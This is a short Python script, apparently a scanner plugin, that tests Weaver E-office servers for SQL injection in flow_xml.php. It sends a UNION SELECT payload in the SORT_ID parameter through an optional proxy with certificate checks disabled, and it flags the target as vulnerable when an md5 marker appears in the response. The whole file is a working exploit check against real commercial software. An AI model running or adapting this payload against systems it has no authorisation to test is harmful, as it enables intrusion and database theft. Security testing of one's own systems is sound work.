import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        aa1 = requests.get(url1+'general/system/workflow/flow_type/flow_xml.php?SORT_ID=1%20union%20select%201,(md5(5)),3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1',proxies=proxies,verify=False,timeout=15,cookies=s_cookie)
        if aa1.status_code==200 and 'e4da3b7fbbce2345d7772b0674a318d5' in aa1.text:
            cdd='[+]漏洞存在\ngeneral/system/workflow/flow_type/flow_xml.php?SORT_ID=1%20union%20select%201,(md5(5)),3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1'
        else:
            cdd='[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 E-office /flow_xml.phpSQL注入 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)